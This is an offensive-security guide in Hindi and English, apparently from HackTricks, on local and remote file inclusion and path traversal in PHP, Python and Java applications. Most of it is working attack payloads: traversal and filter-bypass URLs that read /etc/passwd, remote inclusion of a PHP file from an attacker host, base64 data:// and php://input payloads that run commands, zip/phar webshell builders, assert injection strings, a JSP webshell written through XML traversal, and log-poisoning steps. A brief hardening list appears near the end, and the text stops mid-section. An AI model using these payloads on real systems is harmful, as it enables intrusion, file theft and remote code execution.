# File Inclusion/Path traversal

{{#include ../../banners/hacktricks-training.md}}

## File Inclusion

**Remote File Inclusion (RFI):** फाइल एक रिमोट सर्वर से लोड होती है (सबसे अच्छा: आप कोड लिख सकते हैं और सर्वर उसे निष्पादित करेगा). In php यह डिफ़ॉल्ट रूप से **अक्षम** है (**allow_url_include**).\
**Local File Inclusion (LFI):** सर्वर एक स्थानीय फ़ाइल लोड करता है.

The vulnerability तब होती है जब यूज़र किसी तरह उस फाइल को नियंत्रित कर सकता है जिसे सर्वर लोड करने वाला है.

Vulnerable **PHP functions**: require, require_once, include, include_once

एक रोचक टूल इस vulnerability को exploit करने के लिए: [https://github.com/kurobeats/fimap](https://github.com/kurobeats/fimap)

## Blind - Interesting - LFI2RCE files
```python
wfuzz -c -w ./lfi2.txt --hw 0 http://10.10.10.10/nav.php?page=../../../../../../../FUZZ
```
### **Linux**

**कई \*nix LFI सूची मिलाकर और अधिक paths जोड़कर मैंने यह बनाया है:**


{{#ref}}
https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/file_inclusion_linux.txt
{{#endref}}

साथ ही `/` को `\` में बदलकर भी आज़माएँ\
साथ ही `../../../../../` जोड़कर भी आज़माएँ

कई तकनीकों का उपयोग करके फ़ाइल /etc/password खोजने के लिए (जाँचने के लिए कि कमज़ोरी मौजूद है) एक सूची [here](https://github.com/xmendez/wfuzz/blob/master/wordlist/vulns/dirTraversal-nix.txt) मिल सकती है

### **Windows**

विभिन्न wordlists का merge:


{{#ref}}
https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/file_inclusion_windows.txt
{{#endref}}

साथ ही `/` को `\` में बदलकर भी आज़माएँ\
साथ ही `C:/` हटाकर `../../../../../` जोड़कर भी आज़माएँ

कई तकनीकों का उपयोग करके फ़ाइल /boot.ini खोजने के लिए (जाँचने के लिए कि कमज़ोरी मौजूद है) एक सूची [here](https://github.com/xmendez/wfuzz/blob/master/wordlist/vulns/dirTraversal-win.txt) मिल सकती है

### **OS X**

linux की LFI सूची चेक करें।

## बुनियादी LFI और bypasses

सभी उदाहरण Local File Inclusion के लिए हैं लेकिन Remote File Inclusion पर भी लागू किए जा सकते हैं (page=[http://myserver.com/phpshellcode.txt\\](<http://myserver.com/phpshellcode.txt)//>).
```
http://example.com/index.php?page=../../../etc/passwd
```
### traversal sequences गैर-रेकर्सिव रूप से हटाए गए
```python
http://example.com/index.php?page=....//....//....//etc/passwd
http://example.com/index.php?page=....\/....\/....\/etc/passwd
http://some.domain.com/static/%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c/etc/passwd
```
### **Null byte (%00)**

प्रदान किए गए string के अंत में अतिरिक्त characters जोड़ दिए जाने को बायपास करें (bypass of: $\_GET\['param']."php")
```
http://example.com/index.php?page=../../../etc/passwd%00
```
यह **PHP 5.4 से सुलझा हुआ है**

### **एन्कोडिंग**

आप गैर-मानक एन्कोडिंग्स का उपयोग कर सकते हैं, जैसे double URL encode (और अन्य):
```
http://example.com/index.php?page=..%252f..%252f..%252fetc%252fpasswd
http://example.com/index.php?page=..%c0%af..%c0%af..%c0%afetc%c0%afpasswd
http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd
http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd%00
```
### मौजूदा folder से

शायद back-end folder path की जाँच कर रहा है:
```python
http://example.com/index.php?page=utils/scripts/../../../../../etc/passwd
```
### सर्वर पर फ़ाइल सिस्टम डायरेक्टरीज़ का अन्वेषण

कुछ तकनीकों का उपयोग करके सर्वर के फ़ाइल सिस्टम को पुनरावर्ती तरीके से खोजा जा सकता है ताकि केवल फ़ाइलें ही नहीं बल्कि डायरेक्टरीज़ भी पहचानी जा सकें। इस प्रक्रिया में डायरेक्टरी की गहराई निर्धारित करना और विशिष्ट फ़ोल्डरों के अस्तित्व की जांच शामिल है। इसे प्राप्त करने के लिए नीचे एक विस्तृत तरीका दिया गया है:

1. **डायरेक्टरी गहराई निर्धारित करें:** अपनी वर्तमान डायरेक्टरी की गहराई जानें, `/etc/passwd` फाइल को सफलतापूर्वक प्राप्त करके (यदि सर्वर Linux-आधारित है तो लागू)। एक उदाहरण URL निम्नलिखित संरचना में हो सकता है, जो तीन की गहराई प्रदर्शित करता है:
```bash
http://example.com/index.php?page=../../../etc/passwd # depth of 3
```
2. **Probe for Folders:** संदिग्ध फ़ोल्डर का नाम (उदा., `private`) URL में जोड़ें, फिर `/etc/passwd` पर वापस जाएँ। अतिरिक्त डायरेक्टरी स्तर के कारण depth को एक बढ़ाना होगा:
```bash
http://example.com/index.php?page=private/../../../../etc/passwd # depth of 3+1=4
```
3. **परिणामों की व्याख्या करें:** सर्वर का जवाब संकेत देता है कि फ़ोल्डर मौजूद है या नहीं:
- **त्रुटि / कोई आउटपुट नहीं:** निर्दिष्ट स्थान पर `private` फ़ोल्डर संभवतः मौजूद नहीं है।
- **Contents of `/etc/passwd`:** `private` फ़ोल्डर मौजूद होने की पुष्टि होती है।
4. **पुनरावर्ती अन्वेषण:** मिले हुए फ़ोल्डरों की उप-डायरेक्टरीज़ या फ़ाइलों के लिए उसी तकनीक या पारंपरिक Local File Inclusion (LFI) तरीकों का उपयोग कर आगे परीक्षण किया जा सकता है।

फाइल सिस्टम में अलग-अलग स्थानों पर डायरेक्टरीज़ की जांच करने के लिए payload को तदनुसार समायोजित करें। उदाहरण के लिए, यह जांचने के लिए कि `/var/www/` में `private` डायरेक्टरी है या नहीं (मानते हुए कि वर्तमान डायरेक्टरी की गहराई 3 है), उपयोग करें:
```bash
http://example.com/index.php?page=../../../var/www/private/../../../etc/passwd
```
### **Path Truncation Technique**

Path truncation एक तरीका है जिसका उपयोग वेब एप्लिकेशन में फाइल पथों को बदलने के लिए किया जाता है। इसका अक्सर उपयोग उन प्रतिबंधित फ़ाइलों तक पहुंचने के लिए किया जाता है जिन्हें फ़ाइल पथों के अंत में अतिरिक्त अक्षर जोड़ने वाले कुछ सुरक्षा उपाय बायपास करके छुपाया जाता है। लक्ष्य ऐसा फाइल पथ बनाना है कि सुरक्षा उपाय द्वारा बदला जाने पर भी वह इच्छित फ़ाइल की ओर इशारा करे।

In PHP, फाइल सिस्टम की प्रकृति के कारण किसी फ़ाइल पथ के विभिन्न रूप समान माने जा सकते हैं। उदाहरण के लिए:

- `/etc/passwd`, `/etc//passwd`, `/etc/./passwd`, and `/etc/passwd/` को सभी एक ही पथ माना जाता है।
- जब अंतिम 6 अक्षर `passwd` हों, तो अंत में `/` जोड़ने (जिससे यह `passwd/` बनता है) लक्ष्य फ़ाइल को बदलता नहीं है।
- इसी तरह, अगर किसी फ़ाइल पथ में `.php` जोड़ा गया हो (जैसे `shellcode.php`), तो अंत में `/.` जोड़ने से एक्सेस की जा रही फ़ाइल बदलती नहीं है।

The provided examples demonstrate how to utilize path truncation to access `/etc/passwd`, a common target due to its sensitive content (उपयोगकर्ता खाता जानकारी):
```
http://example.com/index.php?page=a/../../../../../../../../../etc/passwd......[ADD MORE]....
http://example.com/index.php?page=a/../../../../../../../../../etc/passwd/././.[ADD MORE]/././.
```

```
http://example.com/index.php?page=a/./.[ADD MORE]/etc/passwd
http://example.com/index.php?page=a/../../../../[ADD MORE]../../../../../etc/passwd
```
इन मामलों में, आवश्यक traversals की संख्या लगभग 2027 हो सकती है, लेकिन यह संख्या सर्वर की कॉन्फ़िगरेशन के आधार पर बदल सकती है।

- **Using Dot Segments and Additional Characters**: Traversal sequences (`../`) और अतिरिक्त dot segments और characters के संयोजन से फ़ाइल सिस्टम में नेविगेट किया जा सकता है, और सर्वर द्वारा जोड़े गए appended strings को प्रभावी रूप से अनदेखा किया जा सकता है।
- **Determining the Required Number of Traversals**: Trial and error के माध्यम से, कोई भी यह पता लगा सकता है कि रूट निर्देशिका तक और फिर `/etc/passwd` तक पहुँचने के लिए कितनी `../` sequences की आवश्यकता है, यह सुनिश्चित करते हुए कि किसी भी appended strings (जैसे `.php`) को neutralize किया गया है पर इच्छित path (`/etc/passwd`) बरकरार रहता है।
- **Starting with a Fake Directory**: यह सामान्य प्रथा है कि path की शुरुआत एक non-existent directory (जैसे `a/`) से की जाए। यह technique सावधानी के तौर पर या सर्वर के path parsing logic की आवश्यकताओं को पूरा करने के लिए उपयोग की जाती है।

path truncation techniques का उपयोग करते समय, सर्वर के path parsing व्यवहार और फ़ाइल सिस्टम की संरचना को समझना अनिवार्य है। हर परिदृश्य के लिए अलग दृष्टिकोण आवश्यक हो सकता है, और सबसे प्रभावी तरीका खोजने के लिए अक्सर परीक्षण आवश्यक होता है।

**This vulnerability was corrected in PHP 5.3.**

### **Filter bypass tricks**
```
http://example.com/index.php?page=....//....//etc/passwd
http://example.com/index.php?page=..///////..////..//////etc/passwd
http://example.com/index.php?page=/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd
Maintain the initial path: http://example.com/index.php?page=/var/www/../../etc/passwd
http://example.com/index.php?page=PhP://filter
```
## Remote File Inclusion

php में यह डिफ़ॉल्ट रूप से disabled है क्योंकि **`allow_url_include`** **Off.** इसे काम करने के लिए **On** होना चाहिए, और उस स्थिति में आप अपने सर्वर से एक PHP फ़ाइल include करके RCE प्राप्त कर सकते हैं:
```python
http://example.com/index.php?page=http://atacker.com/mal.php
http://example.com/index.php?page=\\attacker.com\shared\mal.php
```
यदि किसी कारणवश **`allow_url_include`** **On** है, लेकिन PHP बाहरी वेबपेजों तक पहुँच को **filtering** कर रहा है, [according to this post](https://matan-h.com/one-lfi-bypass-to-rule-them-all-using-base64/), तो आप उदाहरण के लिए data protocol को base64 के साथ उपयोग करके b64 PHP कोड को डिकोड करके egt RCE प्राप्त कर सकते हैं:
```
PHP://filter/convert.base64-decode/resource=data://plain/text,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+.txt
```
> [!TIP]
> पिछले कोड में, अंतिम `+.txt` इसलिए जोड़ा गया था क्योंकि हमलावर को एक string चाहिए था जो `.txt` पर खत्म होता हो, इसलिए string इसके साथ खत्म होता है और b64 decode के बाद वह भाग केवल जंक लौटाएगा और असली PHP code included होगा (और इसलिए, executed)।

एक और उदाहरण **`php://` प्रोटोकॉल का उपयोग न करते हुए** होगा:
```
data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+txt
```
## Python रूट एलिमेंट

Python में इस तरह के कोड में:
```python
# file_name is controlled by a user
os.path.join(os.getcwd(), "public", file_name)
```
यदि उपयोगकर्ता **absolute path** को **`file_name`** में पास करता है, तो **previous path बस हटा दिया जाता है**:
```python
os.path.join(os.getcwd(), "public", "/etc/passwd")
'/etc/passwd'
```
यह [the docs](https://docs.python.org/3.10/library/os.path.html#os.path.join) के अनुसार अपेक्षित व्यवहार है:

> यदि कोई component एक absolute path है, तो पहले के सभी components हटा दिए जाते हैं और joining absolute path component से जारी रहती है।

## Java डायरेक्टरी सूची

ऐसा लगता है कि यदि आपके पास Java में एक Path Traversal है और आप फ़ाइल के बजाय **डायरेक्टरी के लिए अनुरोध करते हैं**, तो **डायरेक्टरी की सूची लौटाई जाती है**। यह अन्य भाषाओं में नहीं होगा (जितना मुझे पता है)।

## शीर्ष 25 पैरामीटर

यहाँ शीर्ष 25 पैरामीटरों की सूची है जो local file inclusion (LFI) vulnerabilities के प्रति संवेदनशील हो सकते हैं (from [link](https://twitter.com/trbughunters/status/1279768631845494787)):
```
?cat={payload}
?dir={payload}
?action={payload}
?board={payload}
?date={payload}
?detail={payload}
?file={payload}
?download={payload}
?path={payload}
?folder={payload}
?prefix={payload}
?include={payload}
?page={payload}
?inc={payload}
?locate={payload}
?show={payload}
?doc={payload}
?site={payload}
?type={payload}
?view={payload}
?content={payload}
?document={payload}
?layout={payload}
?mod={payload}
?conf={payload}
```
## LFI / RFI using PHP wrappers & protocols

### php://filter

PHP filters पढ़े या लिखे जाने से पहले डेटा पर बुनियादी **संशोधन ऑपरेशन** करने की अनुमति देते हैं। इन फ़िल्टर्स की 5 श्रेणियाँ हैं:

- [String Filters](https://www.php.net/manual/en/filters.string.php):
- `string.rot13`
- `string.toupper`
- `string.tolower`
- `string.strip_tags`: डेटा से टैग हटाएँ (\"<\" और \">\" अक्षरों के बीच की हर चीज)
- Note that this filter has disappear from the modern versions of PHP
- [Conversion Filters](https://www.php.net/manual/en/filters.convert.php)
- `convert.base64-encode`
- `convert.base64-decode`
- `convert.quoted-printable-encode`
- `convert.quoted-printable-decode`
- `convert.iconv.*` : किसी अन्य encoding में बदलता है (`convert.iconv.<input_enc>.<output_enc>`)। समर्थित **सभी एन्कोडिंग्स की सूची** पाने के लिए कंसोल में चलाएँ: `iconv -l`

> [!WARNING]
> `convert.iconv.*` conversion filter का दुरुपयोग करके आप **मनमाना टेक्स्ट उत्पन्न** कर सकते हैं, जो मनमाना टेक्स्ट लिखने या include जैसे फ़ंक्शन को मनमाना टेक्स्ट प्रोसेस करने के लिए उपयोगी हो सकता है। अधिक जानकारी के लिए देखें [**LFI2RCE via php filters**](lfi2rce-via-php-filters.md).

- [Compression Filters](https://www.php.net/manual/en/filters.compression.php)
- `zlib.deflate`: कंटेंट को compress करता है (useful if exfiltrating a lot of info)
- `zlib.inflate`: डेटा को decompress करता है
- [Encryption Filters](https://www.php.net/manual/en/filters.encryption.php)
- `mcrypt.*` : अप्रचलित
- `mdecrypt.*` : अप्रचलित
- Other Filters
- PHP में `var_dump(stream_get_filters());` चलाने पर आप कुछ **अनपेक्षित फ़िल्टर्स** पा सकते हैं:
- `consumed`
- `dechunk`: HTTP chunked encoding को उलट देता है
- `convert.*`
```php
# String Filters
## Chain string.toupper, string.rot13 and string.tolower reading /etc/passwd
echo file_get_contents("php://filter/read=string.toupper|string.rot13|string.tolower/resource=file:///etc/passwd");
## Same chain without the "|" char
echo file_get_contents("php://filter/string.toupper/string.rot13/string.tolower/resource=file:///etc/passwd");
## string.string_tags example
echo file_get_contents("php://filter/string.strip_tags/resource=data://text/plain,<b>Bold</b><?php php code; ?>lalalala");

# Conversion filter
## B64 decode
echo file_get_contents("php://filter/convert.base64-decode/resource=data://plain/text,aGVsbG8=");
## Chain B64 encode and decode
echo file_get_contents("php://filter/convert.base64-encode|convert.base64-decode/resource=file:///etc/passwd");
## convert.quoted-printable-encode example
echo file_get_contents("php://filter/convert.quoted-printable-encode/resource=data://plain/text,£hellooo=");
=C2=A3hellooo=3D
## convert.iconv.utf-8.utf-16le
echo file_get_contents("php://filter/convert.iconv.utf-8.utf-16le/resource=data://plain/text,trololohellooo=");

# Compresion Filter
## Compress + B64
echo file_get_contents("php://filter/zlib.deflate/convert.base64-encode/resource=file:///etc/passwd");
readfile('php://filter/zlib.inflate/resource=test.deflated'); #To decompress the data locally
# note that PHP protocol is case-inselective (that's mean you can use "PhP://" and any other varient)
```
> [!WARNING]
> "php://filter" भाग केस-संवेदी नहीं है

### php filters को oracle के रूप में उपयोग करके किसी भी फ़ाइल पढ़ना

[**In this post**](https://www.synacktiv.com/publications/php-filter-chains-file-read-from-error-based-oracle) में एक तकनीक प्रस्तावित की गई है जो सर्वर से आउटपुट वापस मिले बिना स्थानीय फ़ाइल पढ़ने के लिए है। यह तकनीक php filters को oracle के रूप में उपयोग करके फ़ाइल की **boolean exfiltration (char by char)** पर आधारित है। ऐसा इसलिए है क्योंकि php filters का उपयोग टेक्स्ट को इतना बड़ा करने के लिए किया जा सकता है कि php एक exception फेंक दे।

मूल पोस्ट में आप तकनीक का विस्तृत विवरण पा सकते हैं, लेकिन यहाँ एक संक्षिप्त सारांश है:

- कोडेक **`UCS-4LE`** का उपयोग करें ताकि टेक्स्ट का अग्रिम अक्षर शुरुआत में रहे और स्ट्रिंग का आकार घातीय रूप से बढ़ जाए।
- यह इसका उपयोग एक ऐसा **टेक्स्ट उत्पन्न** करने के लिए किया जाएगा जो इतना बड़ा होगा (जब प्रारंभिक अक्षर सही अनुमानित हो) कि php एक **error** ट्रिगर कर देगा।
- **dechunk** filter सब कुछ हटा देगा अगर पहला char hexadecimal नहीं है, इसलिए हम जान सकते हैं कि पहला char hex है या नहीं।
- यह, पिछले वाले के साथ मिलकर (और अनुमानित अक्षर पर निर्भर अन्य filters), हमें टेक्स्ट की शुरुआत के एक अक्षर का अनुमान लगाने की अनुमति देगा — हम देखेंगे कि कब हम पर्याप्त transformations करते हैं जिससे वह hexadecimal character न रहे। क्योंकि अगर hex है, तो dechunk उसे नहीं हटाएगा और प्रारंभिक बम php error उत्पन्न कर देगा।
- कोडेक **convert.iconv.UNICODE.CP930** हर अक्षर को अगले में बदलता है (इसलिए इस codec के बाद: a -> b)। यह हमें पता लगाने की अनुमति देता है कि पहला अक्षर उदाहरण के लिए `a` है क्योंकि अगर हम इस codec को 6 बार लागू करें तो a->b->c->d->e->f->g हो जाएगा और अक्षर अब hexadecimal character नहीं रहेगा, इसलिए dechunk उसे नहीं हटाएगा और php error ट्रिगर हो जाएगा क्योंकि यह प्रारंभिक बम के साथ गुणा होता है।
- शुरुआत में **rot13** जैसे अन्य transformations का उपयोग करके n, o, p, q, r जैसे अन्य chars को leak करना संभव है (और अन्य codecs का उपयोग अन्य अक्षरों को hex रेंज में लाने के लिए किया जा सकता है)।
- जब प्रारंभिक char एक संख्या हो तो उसे base64 encode करना आवश्यक है और संख्या को leak करने के लिए पहले 2 अक्षरों को leak करना होगा।
- अंतिम समस्या यह देखना है कि **प्रारंभिक अक्षर से अधिक कैसे leak किया जाए**। order memory filters जैसे **convert.iconv.UTF16.UTF-16BE, convert.iconv.UCS-4.UCS-4LE, convert.iconv.UCS-4.UCS-4LE** का उपयोग करके chars का क्रम बदलना और टेक्स्ट के अन्य अक्षरों को पहले स्थिति में लाना संभव है।
- और आगे डेटा प्राप्त करने के लिए विचार यह है कि शुरुआत में **convert.iconv.UTF16.UTF16** के साथ **2 bytes का junk data उत्पन्न** किया जाए, फिर **UCS-4LE** लागू करके इसे अगले 2 bytes के साथ **pivot** कराया जाए, और **delete the data until the junk data** (यह प्रारंभिक टेक्स्ट के पहले 2 bytes को हटा देगा)। इसे तब तक जारी रखें जब तक आप leak करने वाले इच्छित बिट तक नहीं पहुँचते।

पोस्ट में इसे स्वचालित रूप से करने के लिए एक टूल भी leaked किया गया: [php_filters_chain_oracle_exploit](https://github.com/synacktiv/php_filter_chains_oracle_exploit).

### php://fd

यह wrapper उन file descriptors तक पहुँच की अनुमति देता है जो process ने open किए हुए हैं। संभवतः यह opened files की सामग्री को exfiltrate करने के लिए उपयोगी हो सकता है:
```php
echo file_get_contents("php://fd/3");
$myfile = fopen("/etc/passwd", "r");
```
आप **php://stdin, php://stdout और php://stderr** का उपयोग करके क्रमशः **file descriptors 0, 1 और 2** तक पहुँच सकते हैं (यह स्पष्ट नहीं कि यह attack में कैसे उपयोगी हो सकता है)

### zip:// and rar://

एक Zip या Rar फाइल अपलोड करें जिसमें अंदर PHPShell हो और उसे एक्सेस करें.\
rar protocol का दुरुपयोग करने के लिए इसे **विशेष रूप से सक्रिय** किया जाना चाहिए।
```bash
echo "<pre><?php system($_GET['cmd']); ?></pre>" > payload.php;
zip payload.zip payload.php;
mv payload.zip shell.jpg;
rm payload.php

http://example.com/index.php?page=zip://shell.jpg%23payload.php

# To compress with rar
rar a payload.rar payload.php;
mv payload.rar shell.jpg;
rm payload.php
http://example.com/index.php?page=rar://shell.jpg%23payload.php
```
### data://
```
http://example.net/?page=data://text/plain,<?php echo base64_encode(file_get_contents("index.php")); ?>
http://example.net/?page=data://text/plain,<?php phpinfo(); ?>
http://example.net/?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=
http://example.net/?page=data:text/plain,<?php echo base64_encode(file_get_contents("index.php")); ?>
http://example.net/?page=data:text/plain,<?php phpinfo(); ?>
http://example.net/?page=data:text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=
NOTE: the payload is "<?php system($_GET['cmd']);echo 'Shell done !'; ?>"
```
ध्यान दें कि यह प्रोटोकॉल php विन्यासों द्वारा प्रतिबंधित है **`allow_url_open`** और **`allow_url_include`**

### expect://

Expect को सक्रिय होना चाहिए। आप इसका उपयोग करके कोड निष्पादित कर सकते हैं:
```
http://example.com/index.php?page=expect://id
http://example.com/index.php?page=expect://ls
```
### input://

अपना payload POST parameters में निर्दिष्ट करें:
```bash
curl -XPOST "http://example.com/index.php?page=php://input" --data "<?php system('id'); ?>"
```
### phar://

जब कोई वेब एप्लिकेशन फ़ाइल लोड करने के लिए `include` जैसे फंक्शन का उपयोग करता है, तब `.phar` फ़ाइल का उपयोग PHP कोड को चलाने के लिए किया जा सकता है। नीचे दिया गया PHP कोड स्निपेट एक `.phar` फ़ाइल बनाने का उदाहरण दिखाता है:
```php
<?php
$phar = new Phar('test.phar');
$phar->startBuffering();
$phar->addFromString('test.txt', 'text');
$phar->setStub('<?php __HALT_COMPILER(); system("ls"); ?>');
$phar->stopBuffering();
```
`.phar` फ़ाइल को संकलित करने के लिए, निम्नलिखित कमांड को निष्पादित किया जाना चाहिए:
```bash
php --define phar.readonly=0 create_path.php
```
Upon execution, a file named `test.phar` will be created, which could potentially be leveraged to exploit Local File Inclusion (LFI) vulnerabilities.

In cases where the LFI only performs file reading without executing the PHP code within, through functions such as `file_get_contents()`, `fopen()`, `file()`, `file_exists()`, `md5_file()`, `filemtime()`, or `filesize()`, exploitation of a deserialization vulnerability could be attempted. This vulnerability is associated with the reading of files using the `phar` protocol.

For a detailed understanding of exploiting deserialization vulnerabilities in the context of `.phar` files, refer to the document linked below:

[Phar Deserialization Exploitation Guide](phar-deserialization.md)


{{#ref}}
phar-deserialization.md
{{#endref}}

### CVE-2024-2961

यह संभव था कि **any arbitrary file read from PHP that supports php filters** का दुरुपयोग कर के RCE प्राप्त किया जाए। विस्तृत विवरण [**found in this post**](https://www.ambionics.io/blog/iconv-cve-2024-2961-p1)**.**\
बहुत संक्षेप: PHP heap में एक **3 byte overflow** का दुरुपयोग कर के **alter the chain of free chunks** of anspecific size किया गया ताकि **write anything in any address** करने में सक्षम हुआ, इसलिए एक hook जोड़ा गया जो **`system`** को कॉल करे।\
यह संभव था कि अधिक php filters का दुरुपयोग करके specific sizes के लिए chunks को alloc किया जा सके।

### More protocols

Check more possible[ **protocols to include here**](https://www.php.net/manual/en/wrappers.php)**:**

- [php://memory and php://temp](https://www.php.net/manual/en/wrappers.php.php#wrappers.php.memory) — मेमोरी में या एक अस्थायी फ़ाइल में लिखना (यह file inclusion attack में कैसे उपयोगी हो सकता है, स्पष्ट नहीं)
- [file://](https://www.php.net/manual/en/wrappers.file.php) — लोकल फ़ाइलसिस्टम तक पहुँच
- [http://](https://www.php.net/manual/en/wrappers.http.php) — HTTP(s) URLs तक पहुँच
- [ftp://](https://www.php.net/manual/en/wrappers.ftp.php) — FTP(s) URLs तक पहुँच
- [zlib://](https://www.php.net/manual/en/wrappers.compression.php) — संपीड़न स्ट्रीम्स
- [glob://](https://www.php.net/manual/en/wrappers.glob.php) — पैटर्न से मेल खाने वाले pathnames ढूँढना (यह कुछ भी printable नहीं लौटाता, इसलिए यहाँ ज्यादा उपयोगी नहीं)
- [ssh2://](https://www.php.net/manual/en/wrappers.ssh2.php) — Secure Shell 2
- [ogg://](https://www.php.net/manual/en/wrappers.audio.php) — ऑडियो स्ट्रीम्स (किसी भी फ़ाइल पढ़ने के लिए उपयोगी नहीं)

## LFI via PHP's 'assert'

PHP में 'assert' फ़ंक्शन से जुड़े LFI के जोखिम विशेष रूप से अधिक होते हैं, क्योंकि यह strings के अंदर का कोड निष्पादित कर सकता है। यह विशेष रूप से समस्याग्रस्त है अगर input में directory traversal वर्ण जैसे ".." की जाँच की जा रही हो पर सही तरीके से sanitize नहीं किया जा रहा हो।

For example, PHP code might be designed to prevent directory traversal like so:
```bash
assert("strpos('$file', '..') === false") or die("");
```
हालाँकि इसका उद्देश्य traversal को रोकना है, यह अनजाने में code injection के लिए एक वेक्टर बना देता है। file contents पढ़ने के लिए इसका शोषण करने के लिए, एक attacker उपयोग कर सकता है:
```plaintext
' and die(highlight_file('/etc/passwd')) or '
```
इसी तरह, arbitrary system commands चलाने के लिए, कोई उपयोग कर सकता है:
```plaintext
' and die(system("id")) or '
```
यह महत्वपूर्ण है कि इन payloads को **URL-encode** किया जाए।

## PHP Blind Path Traversal

> [!WARNING]
> यह तकनीक उन मामलों में प्रासंगिक है जहाँ आप किसी **PHP फ़ंक्शन** के **फ़ाइल पथ** को **नियंत्रित** करते हैं जो **फ़ाइल तक पहुँच** करेगा पर आप फ़ाइल की सामग्री नहीं देख पाएँगे (जैसे एक साधारण कॉल `file()`), क्योंकि सामग्री दिखाई नहीं जाती।

In [**this incredible post**](https://www.synacktiv.com/en/publications/php-filter-chains-file-read-from-error-based-oracle.html) यह बताया गया है कि कैसे एक blind path traversal को PHP filter के माध्यम से abuse करके **exfiltrate the content of a file via an error oracle** किया जा सकता है।

सारांश में, यह तकनीक फ़ाइल की सामग्री को इतना **बड़ा** बना देने के लिए **"UCS-4LE" encoding** का उपयोग करती है कि उस फ़ाइल को खोलने वाला **PHP फ़ंक्शन** एक **error** ट्रिगर कर दे।

फिर, पहले char को leak करने के लिए फ़िल्टर **`dechunk`** का उपयोग किया जाता है साथ ही अन्य जैसे **base64** या **rot13**, और अंत में फ़िल्टर **convert.iconv.UCS-4.UCS-4LE** और **convert.iconv.UTF16.UTF-16BE** का उपयोग करके **अन्य अक्षरों को शुरुआत में रखकर उन्हें leak किया जाता है**।

**संभावित रूप से प्रभावित होने वाले फ़ंक्शन्स**: `file_get_contents`, `readfile`, `finfo->file`, `getimagesize`, `md5_file`, `sha1_file`, `hash_file`, `file`, `parse_ini_file`, `copy`, `file_put_contents (only target read only with this)`, `stream_get_contents`, `fgets`, `fread`, `fgetc`, `fgetcsv`, `fpassthru`, `fputs`

तकनीकी विवरणों के लिए उल्लिखित पोस्ट देखें!

## LFI2RCE

### Arbitrary File Write via Path Traversal (Webshell RCE)

जब server-side कोड जो फ़ाइलें ingest/uploads करता है destination path को user-controlled डेटा (उदा., filename या URL) से बनाता है बिना canonicalising और validating किए हुए, तो `..` segments और absolute paths intended directory से बाहर निकलकर arbitrary file write का कारण बन सकते हैं। यदि आप payload को किसी web-exposed directory के तहत रख पाते हैं, तो आम तौर पर webshell डालकर unauthenticated RCE मिल जाता है।

Typical exploitation workflow:
- किसी endpoint या background worker में एक write primitive पहचानें जो path/filename स्वीकार करता है और content को disk पर लिखता है (उदा., message-driven ingestion, XML/JSON command handlers, ZIP extractors, आदि)।
- web-exposed directories निर्धारित करें। सामान्य उदाहरण:
- Apache/PHP: `/var/www/html/`
- Tomcat/Jetty: `<tomcat>/webapps/ROOT/` → drop `shell.jsp`
- IIS: `C:\inetpub\wwwroot\` → drop `shell.aspx`
- ऐसा traversal path बनाएं जो intended storage directory से बाहर निकल कर webroot में पहुँच जाए, और उसमें अपने webshell content को शामिल करें।
- dropped payload पर ब्राउज़ करें और कमांड्स execute करें।

Notes:
- जो vulnerable सर्विस यह write करती है वह non-HTTP port पर सुन सकती है (उदा., TCP 4004 पर JMF XML listener)। मुख्य web portal (विभिन्न पोर्ट) बाद में आपका payload serve करेगा।
- Java stacks पर, ये file writes अक्सर simple `File`/`Paths` concatenation के साथ implement होते हैं। canonicalisation/allow-listing का अभाव मुख्य flaw है।

Generic XML/JMF-style example (product schemas vary – the DOCTYPE/body wrapper is irrelevant for the traversal):
```xml
<?xml version="1.0" encoding="UTF-8"?>
<JMF SenderID="hacktricks" Version="1.3">
<Command Type="SubmitQueueEntry">
<!-- Write outside the intake folder into the webroot via traversal -->
<Resource Name="FileName">../../../webapps/ROOT/shell.jsp</Resource>
<Data>
<![CDATA[
<%@ page import="java.io.*" %>
<%
String c = request.getParameter("cmd");
if (c != null) {
Process p = Runtime.getRuntime().exec(c);
try (var in = p.getInputStream(); var out = response.getOutputStream()) {
in.transferTo(out);
}
}
%>
]]>
</Data>
</Command>
</JMF>
```
Hardening जो इस क्लास के बग्स को रोकता है:
- एक canonical path पर resolve करें और सुनिश्चित करें कि यह allow-listed base directory का descendant हो।
- किसी भी path को अस्वीकार करें जिसमें `..`, absolute roots, या drive letters हों; generated filenames को प्राथमिकता दें।
- writer को low-privileged account के रूप में चलाएँ और write directories को served roots से अलग रखें।

## Remote File Inclusion

Explained previously, [**follow this link**](#remote-file-inclusion).

### Via Apache/Nginx log file

यदि Apache या Nginx server include फ़ंक्शन के अंदर **vulnerable to LFI** है, तो आप कोशिश कर सकते हैं कि **`/var/log/apache2/access.log` or `/var/log/nginx/access.log`** तक पहुँचें, **user agent** के अंदर या किसी **GET parameter** में एक php shell जैसे **`<?php system($_GET['c']); ?>`** सेट करें और उस फ़ाइल को include करें

> [!WARNING]
> ध्यान दें कि **यदि आप double quotes का उपयोग करते हैं** shell के लिए simple quotes की बजाय, तो double quotes string "_**quote;**_" में बदल दिए जाएंगे, **PHP वहाँ error देगा** और **कुछ भी execute नहीं होगा**।
>
> साथ ही, सुनिश्चित करें कि आप **payload को सही तरह से लिखते हैं**, नहीं तो हर बार जब PHP लॉग फ़ाइल लोड करने की कोशिश करेगा तो error देगा और आपको दूसरी संभावना नहीं मिलेगी।

यह अन्य logs में भी किया जा सकता है पर **सावधान रहें,** logs के अंदर का कोड URL encoded हो सकता है और इससे Shell खराब हो सकती है। header **authorisation "basic"** में "user:password" Base64 में होता है और यह logs में decoded होता है। PHPShell को इस header के अंदर डाला जा सकता है.\
